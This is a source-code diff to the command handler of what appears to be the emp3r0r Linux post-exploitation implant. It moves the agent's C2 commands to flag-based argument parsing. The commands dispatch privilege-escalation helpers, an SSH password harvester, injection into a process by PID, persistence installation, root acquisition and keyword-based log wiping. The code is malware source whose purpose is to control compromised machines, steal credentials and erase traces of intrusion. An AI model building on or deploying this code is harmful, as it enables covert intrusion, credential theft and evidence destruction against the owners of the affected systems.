@@ -11,24 +11,29 @@ import (
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/spf13/pflag"
 )
 
 func platformC2CommandsHandler(cmdSlice []string) (out string) {
 	var err error
 
+	// parse command-line arguments using pflag
+	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
+	flags.Parse(cmdSlice[1:])
+
 	switch cmdSlice[0] {
 
 	case emp3r0r_data.C2CmdLPE:
 		// LPE helper
-		// !lpe script_name
-		if len(cmdSlice) < 2 {
+		// !lpe --script_name script_name
+		scriptName := flags.StringP("script_name", "s", "", "Script name")
+		flags.Parse(cmdSlice[1:])
+		if *scriptName == "" {
 			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
 			log.Printf("%s", out)
 			return
 		}
-
-		helper := cmdSlice[1]
-		out = runLPEHelper(helper)
+		out = runLPEHelper(*scriptName)
 		return
 
 	case emp3r0r_data.C2CmdSSHHarvester:
@@ -38,33 +43,36 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		go sshd_monitor(passfile)
 		return
 
-		// GDB inject
-		// !inject method pid
+	// !inject --method method --pid pid
 	case emp3r0r_data.C2CmdInject:
-		if len(cmdSlice) != 3 {
+		method := flags.StringP("method", "m", "", "Injection method")
+		pid := flags.StringP("pid", "p", "", "Process ID")
+		flags.Parse(cmdSlice[1:])
+		if *method == "" || *pid == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		out = fmt.Sprintf("%s: success", cmdSlice[1])
-		pid, err := strconv.ParseInt(cmdSlice[2], 10, 32)
+		out = fmt.Sprintf("%s: success", *method)
+		pidInt, err := strconv.ParseInt(*pid, 10, 32)
 		if err != nil {
 			log.Print("Invalid pid")
 		}
-		err = InjectorHandler(int(pid), cmdSlice[1])
+		err = InjectorHandler(int(pidInt), *method)
 		if err != nil {
 			out = "Error: " + err.Error()
 		}
 		return
 
-		// persistence
-		// !persistence method
+	// !persistence --method method
 	case emp3r0r_data.C2CmdPersistence:
-		if len(cmdSlice) != 2 {
+		method := flags.StringP("method", "m", "", "Persistence method")
+		flags.Parse(cmdSlice[1:])
+		if *method == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 		out = "Success"
-		if cmdSlice[1] == "all" {
+		if *method == "all" {
 			err = PersistAllInOne()
 			if err != nil {
 				log.Print(err)
@@ -72,9 +80,9 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 			}
 		} else {
 			out = "Error: No such method available"
-			if method, exists := PersistMethods[cmdSlice[1]]; exists {
+			if persistMethod, exists := PersistMethods[*method]; exists {
 				out = "Success"
-				err = method()
+				err = persistMethod()
 				if err != nil {
 					log.Println(err)
 					out = fmt.Sprintf("Error: %v", err)
@@ -83,8 +91,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		return
 
-		// get_root
-		// !get_root
+	// !get_root
 	case emp3r0r_data.C2CmdGetRoot:
 		if os.Geteuid() == 0 {
 			out = "Warning: You already have root!"
@@ -97,16 +104,16 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		return
 
-		// log cleaner
-		// !clean_log keyword
+	// !clean_log --keyword keyword
 	case emp3r0r_data.C2CmdCleanLog:
-		if len(cmdSlice) != 2 {
+		keyword := flags.StringP("keyword", "k", "", "Keyword to clean logs")
+		flags.Parse(cmdSlice[1:])
+		if *keyword == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		keyword := cmdSlice[1]
 		out = "Done"
-		err = CleanAllByKeyword(keyword)
+		err = CleanAllByKeyword(*keyword)
 		if err != nil {
 			out = err.Error()
 		}
